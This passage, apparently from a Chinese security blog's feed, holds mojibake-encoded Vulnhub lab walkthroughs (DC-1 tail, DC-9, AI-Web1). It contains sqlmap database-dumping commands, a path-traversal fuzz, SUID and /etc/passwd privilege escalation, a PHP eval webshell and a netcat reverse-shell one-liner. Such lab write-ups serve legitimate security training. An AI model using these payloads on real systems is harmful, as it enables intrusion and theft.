src="https://pic.imgdb.cn/item/66e25a2ed9c307b7e94097ce.png"></p><p>æŸ¥æ‰¾é…ç½®æ–‡ä»¶çš„è·¯å¾„ </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sites/default/settings.php</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66e25b12d9c307b7e943f5d8.png"></p><p>è¿›å…¥åcat settings.pyæŸ¥çœ‹å†…å®¹</p><p>å‘ç°æ˜¯ä¸€æ®µphpä»£ç ï¼Œå¹¶ä¸”æœ‰flag2çš„æç¤ºä¿¡æ¯</p><p><img src="https://pic.imgdb.cn/item/66e25b6ad9c307b7e9452cd2.png"></p><p>å¹¶ä¸”ç»™å‡ºäº†mysqlçš„ç”¨æˆ·åä¸å¯†ç </p><p><img src="https://pic.imgdb.cn/item/66e25b9cd9c307b7e9462c85.png"></p><p>æ•°æ®åº“è¿æ¥</p><p><img src="https://pic.imgdb.cn/item/66e25c27d9c307b7e946e62b.png"></p><p>æŸ¥çœ‹æ•°æ®åº“</p><p><img src="C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240912111449580.png" alt="image-20240912111449580"></p><p>æŸ¥çœ‹drupaldbæ•°æ®åº“ä¸­çš„è¡¨</p><p><img src="https://pic.imgdb.cn/item/66e25cdfd9c307b7e947a52a.png"></p><p>å­˜åœ¨usersè¡¨ï¼ŒæŸ¥çœ‹usersè¡¨çš„ç»“æ„</p><p><img src="https://pic.imgdb.cn/item/66e25d7fd9c307b7e948508a.png"></p><p>æŸ¥çœ‹name,passçš„å†…å®¹</p><p><img src="https://pic.imgdb.cn/item/66e25ddad9c307b7e948aa2d.png"></p><p>å‘ç°admin</p><p>å¯†ç çš„åŠ å¯†æ–¹å¼æ˜¯è‡ªå®šä¹‰çš„ï¼ŒæŸ¥æ‰¾å­˜åœ¨passwordå­—æ ·çš„æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find . -name *password*</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66e25e68d9c307b7e949423b.png"></p><p>å‘ç°password-hash.shæ–‡ä»¶ï¼ŒæŸ¥çœ‹æ–‡ä»¶å†…å®¹</p><p><img src="https://pic.imgdb.cn/item/66e2e4dbd9c307b7e91ae88e.png"></p><p>æ˜¯ä¸€æ®µphpä»£ç </p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œå°†ä¸Šé¢æˆ‘ä»¬å‘ç°çš„adminè´¦æˆ·çš„å¯†ç æ”¹æˆæˆ‘ä»¬æƒ³è¦çš„å€¼(e.g. 123456)</p><p><img src="https://pic.imgdb.cn/item/66e2e5c6d9c307b7e91c43a7.png"></p><p>é‚£ä¹ˆä¾¿å¯ä»¥å°†å¾—åˆ°çš„å€¼æ›¿æ¢æ•°æ®åº“ä¸­å­˜å‚¨çš„å¯†ç å€¼</p><p>å…ˆè¿æ¥æ•°æ®åº“å  <code>mysql -udbuser -pR0ck3t</code></p><p>è¿›å…¥åˆ°drupaldbåº“ä¸­ <code>use drupaldb</code></p><p>ç„¶åä½¿ç”¨updateè¯­å¥æ›´æ–°å­˜å‚¨çš„å€¼ </p><p><img src="https://pic.imgdb.cn/item/66e2e6ecd9c307b7e920f009.png"></p><p>æ›´æ–°å®Œæˆåä½¿ç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„å€¼åœ¨é¡µé¢ç™»å½•</p><p><img src="https://pic.imgdb.cn/item/66e2e73ad9c307b7e92219c3.png"></p><p>ç™»å½•æˆåŠŸååœ¨dashboardä¸­çœ‹åˆ°äº†flag3çš„å­—æ ·</p><p>ç‚¹å‡»æŸ¥çœ‹ å‘ç°æç¤ºä¿¡æ¯</p><p>æ„æ€ä¸ºï¼šç‰¹æ®Šçš„PERMSå°†æœ‰åŠ©äºæ‰¾åˆ°passwd-ä½†æ‚¨éœ€è¦æ‰§è¡Œè¯¥å‘½ä»¤ä»¥ç¡®å®šå¦‚ä½•è·å–shadowä¸­çš„å†…å®¹ã€‚</p><p>æŸ¥çœ‹&#x2F;etc&#x2F;passwd</p><p><img src="https://pic.imgdb.cn/item/66e2e85bd9c307b7e926cbf6.png"></p><p>æœ€åä¸€è¡Œå‘ç°flag4,å¹¶ä¸”flag4æ˜¯æ™®é€šç”¨æˆ·</p><p>è¯»å–å…¶å†…å®¹</p><p><img src="https://pic.imgdb.cn/item/66e2e8d2d9c307b7e9276a4c.png"></p><p>æç¤ºè·å–flag4éœ€è¦rootæƒé™</p><p>ç»“åˆflag3çš„æç¤ºSpecial PERMSï¼ˆç‰¹æ®Šæƒé™ï¼‰æŒ‡å¸¦æœ‰æƒé™çš„ç‰¹æ®Šæ–‡ä»¶ï¼Œå¯ä»¥æƒ³åˆ°ä½¿ç”¨suidææƒ</p><p>é¦–å…ˆä½¿ç”¨å‘½ä»¤æŸ¥æ‰¾ è¿™äº›å…·æœ‰ç‰¹æ®Šæƒé™çš„æ–‡ä»¶</p><p><code>find / -perm /4000 2&gt;/dev/null</code></p><p><img src="https://pic.imgdb.cn/item/66e2ea32d9c307b7e9293ca6.png"></p><p>å¯ä»¥ä½¿ç”¨findå‘½ä»¤ææƒ</p><p>é¦–å…ˆå¯ä»¥æŸ¥çœ‹findå‘½ä»¤çš„æƒé™</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> 666</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">find -name 666 -<span class="built_in">exec</span> <span class="string">&quot;whoami&quot;</span> \;</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66e2eddfd9c307b7e92eb120.png"></p><p>ææƒ <code>/bin/bash</code> æˆ–è€… <code>/bin/sh</code></p><p>ææƒåè®¿é—®&#x2F;root&#x2F; æ‹¿åˆ°flag</p><p><img src="https://pic.imgdb.cn/item/66e2ee20d9c307b7e92f2543.png"></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨ </tag>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC9</title>
      <link href="/posts/35045482/"/>
      <url>/posts/35045482/</url>
      
        <content type="html"><![CDATA[<h2 id="DC-9"><a href="#DC-9" class="headerlink" title="DC-9"></a>DC-9</h2><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p>ä¸‹è½½å¥½é¶æœºåï¼Œå°†é¶æœºç½‘ç»œè®¾ç½®ä¸ºnetæ¨¡å¼</p><p>kaliæ‰«æä¸»æœº <code>arcp-scan -l</code></p><p><img src="https://pic.imgdb.cn/item/66dabed4d9c307b7e9271e17.png"></p><p>è®¿é—®é¡µé¢</p><p><img src="https://pic.imgdb.cn/item/66dabef1d9c307b7e92733a7.png"></p><p>dirbæ‰«æå‘ç°æ‰«å‡ºæ¥çš„ç›®å½•ä¸é¡µé¢å±•ç¤ºçš„ç›®å½•ä¸€æ ·â€˜</p><p><img src="https://pic.imgdb.cn/item/66dae157d9c307b7e95311c4.png"></p><p><img src="https://pic.imgdb.cn/item/66dae171d9c307b7e9535971.png"></p><p>nmapæ‰«ææŸ¥çœ‹å¼€æ”¾çš„ç«¯å£</p><p><img src="https://pic.imgdb.cn/item/66dae206d9c307b7e9540bfb.png"></p><p>80ç«¯å£å¼€æ”¾ï¼Œ22ç«¯å£å…³é—­</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>åœ¨&#x2F;search.phpé¡µé¢å­˜åœ¨ç™»å½•ç•Œé¢ï¼ŒçŒœæµ‹å­˜åœ¨sqlæ³¨å…¥</p><p>sqlmapæµ‹è¯•</p><p><img src="https://pic.imgdb.cn/item/66dae387d9c307b7e956842f.png"></p><p>å­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼Œä¾æ¬¡çˆ†åº“åï¼Œè¡¨åï¼Œåˆ—å</p><p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch --dbs</code></p><p><img src="https://pic.imgdb.cn/item/66dae428d9c307b7e957e370.png"></p><p>é¦–å…ˆæŸ¥çœ‹usersåº“çš„å†…å®¹</p><p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D users --tables</code></p><p><img src="https://pic.imgdb.cn/item/66dae4a5d9c307b7e958901a.png"></p><p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D users -T UserDetails --columns</code></p><p><img src="https://pic.imgdb.cn/item/66dae533d9c307b7e959a422.png"></p><p>æŸ¥çœ‹usernameä¸passwordçš„å†…å®¹</p><p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D users -T UserDetails -C username,password --dump</code></p><p><img src="https://pic.imgdb.cn/item/66dae59dd9c307b7e95a6f24.png"></p><p>å°†å¾—åˆ°çš„usernameä¸passwordåˆ†åˆ«ä¿å­˜åˆ°userä¸passwordä¸­</p><p>é€‰ä¸€ä¸ªç”¨æˆ·åœ¨&#x2F;manage.phpé¡µé¢ç™»å½•ï¼Œå‘ç°æŠ¥é”™</p><p>æ¥ç€æŸ¥çœ‹Staffåº“çš„å†…å®¹</p><p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D Staff --columns</code></p><p><img src="https://pic.imgdb.cn/item/66dae67ad9c307b7e95cf176.png"></p><p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D Staff -T Users -C Username,Password --dump</code></p><p><img src="https://pic.imgdb.cn/item/66dae74ad9c307b7e95e4f32.png"></p><p>å‘ç°ä¸€ä¸ªæ–°çš„è´¦å·å’Œå¯†ç ï¼Œå°è¯•ç™»å½•å‘ç°æˆåŠŸ</p><p><img src="https://pic.imgdb.cn/item/66dae7a1d9c307b7e95e98c1.png"></p><p>æ ¹æ®æˆåŠŸç™»å½•åçš„ç•Œé¢File does not existçŒœæµ‹å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p><p><code>noglob wfuzz -c -u http://192.168.154.136/manage.php?FUZZ=../../../../../etc/passwd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H &quot;Cookie:PHPSESSID=80guork76fj0lt1gq8nvnasdhb&quot; --hw 100</code></p><p><img src="https://pic.imgdb.cn/item/66daec6ed9c307b7e9638d6f.png"></p><p>å­˜åœ¨fileå‚æ•°</p><p>å°è¯•ä½¿ç”¨BurpSuiteçˆ†ç ´</p><p><img src="https://pic.imgdb.cn/item/66daedabd9c307b7e964bcd0.png"></p><p>æ¥ç€è®¿é—®&#x2F;proc&#x2F;sched_debugæŸ¥çœ‹cpuçš„è°ƒåº¦çŠ¶å†µ</p><p><img src="https://pic.imgdb.cn/item/66daeeb3d9c307b7e965ce40.png"></p><p>åœ¨è°ƒåº¦è¿›ç¨‹ä¸­å‘ç°knockd</p><p><img src="https://pic.imgdb.cn/item/66daef07d9c307b7e966d7ac.png"></p><p>knockd.confæ–‡ä»¶å­˜åœ¨äº&#x2F;etc&#x2F;knockd.confä¸‹ï¼Œä¸sshç«¯å£çš„å¼€æ”¾æœ‰å…³</p><p>è®¿é—®knockdçš„ç›®å½•ï¼ŒæŸ¥çœ‹å…¶å†…å®¹</p><p><img src="https://pic.imgdb.cn/item/66daefaed9c307b7e96894a9.png"></p><p>æ„æ€ä¸ºä¾æ¬¡é¡ºåºè®¿é—®7469ï¼Œ8475ï¼Œ9842ç«¯å£åï¼Œsshçš„22ç«¯å£å¼€æ”¾ï¼Œé€†åºè®¿é—®åˆ™å…³é—­ï¼Œé‚£ä¹ˆä¾æ¬¡è®¿é—®ç«¯å£</p><p><img src="https://pic.imgdb.cn/item/66daf041d9c307b7e969ab56.png"></p><p>è®¿é—®åå‘ç°22ç«¯å£å¼€æ”¾</p><p>ä¸‹é¢ä»22ç«¯å£å…¥æ‰‹ï¼Œå°†ä¸Šæ–‡ä¸­æˆ‘ä»¬å¾—åˆ°çš„ç”¨æˆ·åå’Œå¯†ç çˆ†ç ´</p><p><img src="https://pic.imgdb.cn/item/66daf11bd9c307b7e96ba1e7.png"></p><p>å¾—åˆ°ä¸‰ä¸ªç”¨æˆ·åä¸å¯†ç </p><p>ä¾æ¬¡å°è¯•sshè¿æ¥ï¼Œåœ¨janitorç”¨æˆ·ä¸‹å‘ç°å¤šä¸€å±‚ç›®å½•</p><p><img src="https://pic.imgdb.cn/item/66daf1c4d9c307b7e96d2aab.png"></p><p>å‘ç°æ–°çš„å¯†ç ï¼Œå°†æ–°çš„å¯†ç ä¿å­˜èµ·æ¥ï¼Œå†ç»“åˆä¹‹å‰çš„ç”¨æˆ·åå†æ¬¡çˆ†ç ´</p><p><img src="https://pic.imgdb.cn/item/66daf2dcd9c307b7e96ec197.png"></p><p>å‘ç°æ–°çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œsshè¿æ¥è®¿é—®</p><p><img src="https://pic.imgdb.cn/item/66daf3bcd9c307b7e9710a4b.png"></p><p>sudo -læŸ¥çœ‹ç”¨æˆ·æƒé™</p><p>å‘ç°å¯ä»¥ä¸éœ€è¦å¯†ç è®¿é—®test</p><p>æŸ¥çœ‹testçš„æ–‡ä»¶å±æ€§ï¼Œå‘ç°ä½¿å¯æ‰§è¡Œæ–‡ä»¶</p><p><img src="https://pic.imgdb.cn/item/66daf49ed9c307b7e973050e.png"></p><p>åœ¨&#x2F;opt&#x2F;devstuff&#x2F;ä¸‹å¯ä»¥å‘ç°æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½œç”¨å°±æ˜¯å°†ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹è¯»å–å‡ºæ¥ï¼Œå¹¶è¿½åŠ åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ä¸­</p><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•ç›´æ¥è¿½åŠ ä¸€ä¸ªæœ‰rootæƒé™çš„è´¦å·åˆ°&#x2F;etc&#x2F;passwdä¸­</p><p><img src="https://pic.imgdb.cn/item/66daf5a2d9c307b7e973fc12.png"></p><p>å…ˆå°†ç”Ÿæˆçš„è´¦å·æ·»åŠ åˆ°ä¸´æ—¶æ–‡ä»¶ä¸­ï¼Œå†ä½¿ç”¨testè¿½åŠ åˆ°&#x2F;etc&#x2F;passwd&#x2F;ä¸­</p><p><img src="https://pic.imgdb.cn/item/66daf67fd9c307b7e974c5fd.png"></p><p>ææƒåè®¿é—®&#x2F;root&#x2F;æˆåŠŸæ‹¿åˆ°flag</p><p><img src="https://pic.imgdb.cn/item/66daf6ead9c307b7e97522c7.png"></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨ </tag>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhubé¶æœº--AI-Web1</title>
      <link href="/posts/ff3ef111/"/>
      <url>/posts/ff3ef111/</url>
      
        <content type="html"><![CDATA[<h2 id="Ai-Web1"><a href="#Ai-Web1" class="headerlink" title="Ai-Web1"></a>Ai-Web1</h2><h3 id="1-ä¿¡æ¯æœé›†"><a href="#1-ä¿¡æ¯æœé›†" class="headerlink" title="1.ä¿¡æ¯æœé›†"></a>1.ä¿¡æ¯æœé›†</h3><p>é¦–å…ˆnetdiscoverå‘ç°é¶æœºip</p><p><img src="https://pic.imgdb.cn/item/66bc724ad9c307b7e994d94a.png"></p><p>ä½¿ç”¨nmapæ‰«æç«¯å£</p><p><img src="https://pic.imgdb.cn/item/66bc7263d9c307b7e99537d0.png"></p><p>æŸ¥æ‰¾å‘ç°åªå¼€äº†80ç«¯å£</p><p>è®¿é—®é¶æœºip</p><p><img src="https://pic.imgdb.cn/item/66bc7278d9c307b7e9958846.png"></p><p>æ¥ç€ä½¿ç”¨dirbå¯¹ipè¿›è¡Œæ‰«æ</p><p><img src="https://pic.imgdb.cn/item/66bc728fd9c307b7e995dda4.png"></p><p>å¯¹æ‰«æåˆ°çš„ç›®å½•ä¾æ¬¡è¿›è¡Œè®¿é—®</p><p>å­˜åœ¨ç½‘ç»œçˆ¬è™«åè®®robots.txtï¼Œåœ¨&#x2F;robots.txtä¸‹å‡ºç°ä¸¤ä¸ªæ–°çš„ç›®å½•</p><p><img src="https://pic.imgdb.cn/item/66bc72abd9c307b7e9964568.png"></p><p>é‚£ä¹ˆä¾æ¬¡å¯¹ä¸¤ä¸ªç›®å½•è¿›è¡Œè®¿é—®</p><p><img src="https://pic.imgdb.cn/item/66bc7320d9c307b7e997f50d.png"></p><p>å‡è®¿é—®ä¸äº†ï¼Œæ˜¾ç¤ºæ²¡æœ‰æƒé™ï¼Œè®¿é—®<code>http://192.168.154.135/se3reTdir777/</code>å‡ºç°ä¸€ä¸ªæäº¤æ¡†</p><p><img src="https://pic.imgdb.cn/item/66bc738ad9c307b7e9996a21.png"></p><p>æäº¤**â€™**æµ‹è¯•ï¼Œå‡ºç°</p><p><img src="https://pic.imgdb.cn/item/66bc73cad9c307b7e99a3263.png"></p><p>å­˜åœ¨sqlæ³¨å…¥æ¼æ´</p><p>é‚£ä¹ˆæ¥ç€å¯¹<code>http://192.168.154.135/m3diNf0/</code>å’Œ<code>http://192.168.154.135/se3reTdir777/</code>è¿›è¡Œç›®å½•æ‰«æ</p><p><img src="https://pic.imgdb.cn/item/66bc742ad9c307b7e99b75aa.png"></p><p><img src="https://pic.imgdb.cn/item/66bc7483d9c307b7e99d09ec.png">)</p><p>m3diNf0&#x2F;ä¸‹å­˜åœ¨info.php</p><p>se3reTdir777ä¸‹å­˜åœ¨index.php</p><p>ä¾æ¬¡è®¿é—®</p><p><a href="http://192.168.154.135/m3diNf0/info.php%E4%B8%8B%E5%87%BA%E7%8E%B0phpinfo()%E7%95%8C%E9%9D%A2%EF%BC%8C%E6%90%9C%E7%B4%A2document%E4%BC%9A%E5%8F%91%E7%8E%B0%E7%BD%91%E7%AB%99%E7%9A%84%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84">http://192.168.154.135/m3diNf0/info.phpä¸‹å‡ºç°phpinfo()ç•Œé¢ï¼Œæœç´¢documentä¼šå‘ç°ç½‘ç«™çš„ç»å¯¹è·¯å¾„</a> &#x2F;home&#x2F;www&#x2F;html&#x2F;web1x443290o2sdf92213</p><p><img src="https://pic.imgdb.cn/item/66bc74c8d9c307b7e99d77df.png"></p><p>se3reTdir777ä¸‹å­˜åœ¨çš„index.phpå‡ºç°æäº¤æ¡†ï¼ŒçŒœæµ‹å­˜åœ¨sqlæ³¨å…¥æ¼æ´</p><p><img src="https://pic.imgdb.cn/item/66bc751ed9c307b7e99dbebd.png">)</p><h3 id="2-æ¼æ´åˆ©ç”¨"><a href="#2-æ¼æ´åˆ©ç”¨" class="headerlink" title="2.æ¼æ´åˆ©ç”¨"></a>2.æ¼æ´åˆ©ç”¨</h3><p>ç›´æ¥ä½¿ç”¨å·¥å…·sqlmapæµ‹è¯•</p><p><img src="https://pic.imgdb.cn/item/66bc755fd9c307b7e99deef2.png"></p><p>ç¡®å®å­˜åœ¨sqlæ³¨å…¥æ¼æ´</p><p><img src="https://pic.imgdb.cn/item/66bc75a3d9c307b7e99e25b3.png"></p><p>é‚£ä¹ˆä¾æ¬¡çˆ†åº“åï¼Œè¡¨åï¼Œåˆ—åï¼Œå­—æ®µå€¼</p><h4 id="åº“å"><a href="#åº“å" class="headerlink" title="åº“å"></a>åº“å</h4><p><img src="https://pic.imgdb.cn/item/66bc75cdd9c307b7e99e477a.png">)</p><p><img src="https://pic.imgdb.cn/item/66bc7611d9c307b7e99e7b23.png"></p><h4 id="è¡¨å"><a href="#è¡¨å" class="headerlink" title="è¡¨å"></a>è¡¨å</h4><p><img src="https://pic.imgdb.cn/item/66bc763fd9c307b7e99e9dd2.png">)</p><p><img src="https://pic.imgdb.cn/item/66bc767ed9c307b7e99ecf05.png"></p><h4 id="åˆ—å"><a href="#åˆ—å" class="headerlink" title="åˆ—å"></a>åˆ—å</h4><p><img src="https://pic.imgdb.cn/item/66bc76a9d9c307b7e99eed70.png">)</p><p><img src="https://pic.imgdb.cn/item/66bc76dcd9c307b7e99f1aea.png">)</p><p><img src="https://pic.imgdb.cn/item/66bc7706d9c307b7e99f3c4a.png"></p><p><img src="https://pic.imgdb.cn/item/66bc7765d9c307b7e99f83aa.png"></p><p>å¹¶æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨åˆ°çš„åœ°æ–¹</p><p>å°è¯•é€šè¿‡sqlmapè·å–shell</p><p><img src="https://gitee.com/mazishu/images/raw/master/image-20240804210216007.png" alt="image-20240804210216007"></p><p><img src="https://pic.imgdb.cn/item/66bc77edd9c307b7e99fedcf.png"></p><p>æ‹¿åˆ°äº†shell<img src="https://pic.imgdb.cn/item/66bc7814d9c307b7e9a00e8d.png"></p><p>è¾“å…¥idæŸ¥çœ‹å½“å‰shellç”¨æˆ·æ‰€å±ç»„</p><p><img src="https://pic.imgdb.cn/item/66bc7876d9c307b7e9a059b2.png"></p><p>æ˜¯æƒé™æ¯”è¾ƒä½çš„www-data</p><h3 id="3-ä¸Šä¼ æœ¨é©¬"><a href="#3-ä¸Šä¼ æœ¨é©¬" class="headerlink" title="3.ä¸Šä¼ æœ¨é©¬"></a>3.ä¸Šä¼ æœ¨é©¬</h3><p>åœ¨kaliä¸­å†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†æœ¨é©¬æ–‡ä»¶ä¸Šä¼ åˆ°æˆ‘ä»¬å‘ç°çš„ç»å¯¹è·¯å¾„ä¸‹</p><p><img src="https://pic.imgdb.cn/item/66bc78dad9c307b7e9a0aa8e.png"></p><p>è®¿é—®ä¸Šä¼ çš„æœ¨é©¬è·¯å¾„</p><p><img src="https://pic.imgdb.cn/item/66bc7913d9c307b7e9a0d476.png"></p><p>ç©ºç™½åˆ™ä¸Šä¼ æˆåŠŸ</p><p>ä½¿ç”¨èšå‰‘è¿æ¥</p><p><img src="https://pic.imgdb.cn/item/66bc7954d9c307b7e9a10c70.png"></p><p><img src="https://pic.imgdb.cn/item/66bc7987d9c307b7e9a13189.png"></p><h3 id="4-åå¼¹shell"><a href="#4-åå¼¹shell" class="headerlink" title="4.åå¼¹shell"></a>4.åå¼¹shell</h3><p>é¦–å…ˆkaliä¸Šé¢ç›‘å¬ä¸€ä¸‹ç«¯å£ <code>nv -lvvp 6666</code></p><p><img src="https://pic.imgdb.cn/item/66bc79c4d9c307b7e9a15d4a.png"></p><p>åœ¨èšå‰‘ä¸­æˆ‘ä»¬ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶çš„ä½ç½®æ‰“å¼€ç»ˆç«¯</p><p><img src="https://pic.imgdb.cn/item/66bc79ecd9c307b7e9a17c8b.png"></p><p>å‘ç°-eå‚æ•°ä¸å¯ç”¨</p><p>é‚£ä¹ˆä½¿ç”¨å‘½ä»¤**<code>rm /tmp/f;mkfifo/tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.103 6666 &gt;/tmp/f</code>**</p><p><code>rm /tmp/f</code>ï¼šåˆ é™¤ <code>/tmp/f</code> æ–‡ä»¶ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚</p><p><code>mkfifo /tmp/f</code>ï¼šåœ¨ <code>/tmp/</code> ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“ï¼ˆFIFOï¼‰ï¼Œæ–‡ä»¶åä¸º <code>f</code>ã€‚</p><p><code>cat /tmp/f</code>ï¼šè¯»å–å‘½åç®¡é“ <code>/tmp/f</code> ä¸­çš„å†…å®¹ã€‚</p><p><code>|/bin/sh -i 2&gt;&amp;1</code>ï¼šé€šè¿‡ç®¡é“å°†è¯»å–çš„å†…å®¹ä¼ é€’ç»™ <code>/bin/sh -i</code>ï¼Œå®ƒå¯åŠ¨ä¸€ä¸ªäº¤äº’å¼ shell ä¼šè¯ã€‚<code>2&gt;&amp;1</code> å°†æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºã€‚</p><p><code>| nc 192.168.0.103 6666</code>ï¼šå°† shell ä¼šè¯çš„è¾“å‡ºé€šè¿‡ <code>netcat</code> å‘é€åˆ° IP åœ°å€ <code>192.168.0.103</code> çš„ 6666 ç«¯å£ã€‚</p><p><code>&gt;/tmp/f</code>ï¼šå°†ä» <code>netcat</code> æ¥æ”¶åˆ°çš„æ•°æ®å†™å›åˆ°å‘½åç®¡é“ <code>/tmp/f</code>ï¼Œä»è€Œå½¢æˆä¸€ä¸ªå¾ªç¯ã€‚</p><p><img src="https://pic.imgdb.cn/item/66bc7a27d9c307b7e9a1aa55.png"></p><p>æˆåŠŸåå¼¹äº†shell</p><h3 id="5-ææƒ"><a href="#5-ææƒ" class="headerlink" title="5.ææƒ"></a>5.ææƒ</h3><p>åœ¨kalié¡µé¢ä½¿ç”¨pythonå†™äº¤äº’</p><p> <code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><p><img src="https://pic.imgdb.cn/item/66d53fcfd9c307b7e98c6095.png"></p><p>ææƒçš„æ–¹æ³•å¯ä»¥ä½¿ç”¨ï¼Œæ·»åŠ ä¸€ä¸ªè´¦æˆ·è¿›è¡Œç™»å…¥ï¼Œææƒ</p><p>ä½¿ç”¨openssl passwdæ¥ç”Ÿæˆä¸€ä¸ªå¯†ç ä½œä¸ºç”¨æˆ·çš„è´¦å·å¯†ç ï¼Œlinuxä¸­å¯†ç é€šå¸¸å­˜æ”¾åœ¨&#x2F;etc&#x2F;shadowä¸­ï¼Œä»¥åŠ å¯†å½¢å¼å­˜æ”¾</p><p>-1ï¼šè¡¨ç¤ºé‡‡ç”¨çš„æ˜¯MD5åŠ å¯†ç®—æ³•ã€‚</p><p>-saltï¼šæŒ‡å®šsaltå€¼ï¼Œä¸ä½¿ç”¨éšæœºäº§ç”Ÿçš„saltã€‚åœ¨ä½¿ç”¨åŠ å¯†ç®—æ³•è¿›è¡ŒåŠ å¯†æ—¶ï¼Œå³ä½¿å¯†ç ä¸€æ ·ï¼Œsaltä¸ä¸€æ ·ï¼Œæ‰€è®¡ç®—å‡ºæ¥çš„hashå€¼ä¹Ÿä¸ä¸€æ ·ï¼Œé™¤éå¯†ç ä¸€æ ·ï¼Œsaltå€¼ä¹Ÿä¸€æ ·ï¼Œè®¡ç®—å‡ºæ¥çš„hashå€¼æ‰ä¸€æ ·ã€‚</p><p><img src="https://pic.imgdb.cn/item/66d54a9dd9c307b7e99b14ad.png"></p><p>åˆ›å»ºç”¨æˆ·åä¸ºhacker å¯†ç ä¸º123456çš„ç”¨æˆ·</p><p><img src="https://pic.imgdb.cn/item/66d54ad6d9c307b7e99b3c10.png"></p><p>å°†ç”¨æˆ·ä¿¡æ¯å†™å…¥&#x2F;etc&#x2F;passwd</p><p><img src="https://pic.imgdb.cn/item/66d54af8d9c307b7e99b53c0.png"></p><p>ææƒ</p><p><img src="https://pic.imgdb.cn/item/66d54b83d9c307b7e99bb9e3.png"></p><p>è·å¾—flag</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨ </tag>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEBåˆ·ä¸€åˆ·</title>
      <link href="/posts/5286b664/"/>
      <url>/posts/5286b664/</url>
      
